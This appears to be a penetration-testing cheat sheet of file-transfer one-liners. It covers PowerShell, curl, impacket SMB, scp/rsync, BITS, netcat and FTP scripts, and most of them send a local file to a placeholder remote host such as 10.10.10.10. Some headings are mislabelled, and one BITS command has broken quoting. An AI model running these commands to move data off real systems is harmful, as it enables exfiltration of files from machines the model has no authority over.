USING POWERSHELL -
------------------------------------------------------------------------------------------------------------------

#### 

**Web Content Upload**
    
    $webClient.UploadFile('http://10.10.10.10/demo.txt', 'PUT', 'C:\temp\demo.txt')

**Web Content Upload**
    
    powershell.exe -c "curl.exe -T C:\temp\demo.txt http://10.10.10.10/demo.txt"

**Web Content Upload**
    
    Start-Process -FilePath "curl.exe" -ArgumentList "-T 'C:\temp\demo.txt' http://10.10.10.10/demo.txt" -NoNewWindow -Wait
------------------------------------------------------------------------------------------------------------------

</br>

USING CMD - 
------------------------------------------------------------------------------------------------------------------

**Using PUT Method**
    
    powershell.exe -c "$webClient = New-Object System.Net.WebClient; $webClient.UploadFile('http://10.10.10.10/demo.txt', 'PUT', 'C:\temp\demo.txt')"   

**Using POST Method**

    powershell.exe -c "$webClient = New-Object System.Net.WebClient; $webClient.UploadFile('http://10.10.10.10/demo.txt','C:\temp\demo.txt')"
------------------------------------------------------------------------------------------------------------------

</br>

USING SMB - 
------------------------------------------------------------------------------------------------------------------

**SMB SERVER -**

**Start normal SMB Server**
    
    impacket-smbserver share .

**If version error**
    
    impacket-smbserver -smb2support share .

**Use authenticated servers if file transfer is long**

    impacket-smbserver share -username user -password 123 . -smb2support


**SMB CLIENT -**

**To create authenticated session**

    net use \\10.10.10.10 /u:"user" "123"

**Web Content Upload**
    
    copy demo.txt \\10.10.10.10\share\  
------------------------------------------------------------------------------------------------------------------

</br>

USING SSH - 
------------------------------------------------------------------------------------------------------------------

**SCP-**

**Copy a file from Remote PC to Local PC**
    
    scp user@{REMOTE-IP}:/users/public/demo.txt /tmp/

**Copy a directory from Remote PC to Local PC**

    scp -r user@{REMOTE-IP}:/users/public/demo/ /tmp/
    
**Copy a directory from Remote to Local with RSA key**

    scp -i id_rsa -r user@{REMOTE-IP}:/users/public/demo/ /tmp/
    
**RSYNC-**

**Copy a file from Remote PC to Local PC**
    
    rsync -av user@{REMOTE-IP}:/users/public/demo.txt /tmp/

**Copy a directory from Remote PC to Local PC**

    rsync -r user@{REMOTE-IP}:/users/public/demo/ /tmp/
    
**Copy a directory from Remote to Local with RSA key**

    rsync -av --port 22 -e 'ssh -i id_rsa' -r user@{REMOTE-IP}:/users/public/demo/ /tmp/

------------------------------------------------------------------------------------------------------------------

</br>

USING WinRM - 
------------------------------------------------------------------------------------------------------------------

**Web Content Upload**
    
    download demo.txt
------------------------------------------------------------------------------------------------------------------

</br>

USING BITSADMIN - 
------------------------------------------------------------------------------------------------------------------

**Web Content Upload**
    
    Start-BitsTransfer -Source "C:\temp\demo.txt" -Destination "http://10.10.10.10/demo.txt" -TransferType Upload

**Web Content Upload**
    
    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source "C:\temp\demo.txt" -Destination "http://10.10.10.10/demo.txt" -TransferType Upload

**Web Content Upload**
    
    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://10.10.10.10/demo.txt' -Destination 'c:\temp\demo.txt'"

**Web Content Upload**
    
    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://10.10.10.10/demo.txt' -Destination 'c:\temp\demo.txt' -Method 'PUT'"
------------------------------------------------------------------------------------------------------------------

</br>

USING NC / NETCAT - 
------------------------------------------------------------------------------------------------------------------

**Run NC Server on Local PC**
    
    nc.exe -nlvp 443 > demo.txt

**Run NC Client on Remote PC**
    
    nc -v {LOCAL-IP} 443 < demo.txt
                OR
    type demo.txt | nc.exe -v {LOCAL-IP} 443
------------------------------------------------------------------------------------------------------------------

</br>

USING FTP - 
------------------------------------------------------------------------------------------------------------------

**File Upload**

Replace "demo.txt" with desired file name
    
    echo open 10.10.10.10 21 > file.txt
    echo bin>> file.txt
    echo put demo.txt>> file.txt
    echo bye>> file.txt

    ftp -A -v -n -s:file.txt

**One Liner**

    echo open 10.10.10.10 21 > file.txt && echo bin>> file.txt && echo put demo.txt>> file.txt && echo bye>> file.txt && ftp -A -v -n -s:file.txt

**Mannualy -**

    ftp
    open 10.10.10.10 2121
    put demo.txt

**FTP Authenticated**

Replace "demo.txt" with desired file name
    
    echo open 10.10.10.10 21 > file.txt
    echo user test>> file.txt
    echo test>> file.txt
    echo bin>> file.txt
    echo put demo.txt>> file.txt
    echo bye>> file.txt

    ftp -v -n -s:file.txt

**Mannualy -**

    ftp
    open 10.10.10.10 2121
    put demo.txt
------------------------------------------------------------------------------------------------------------------
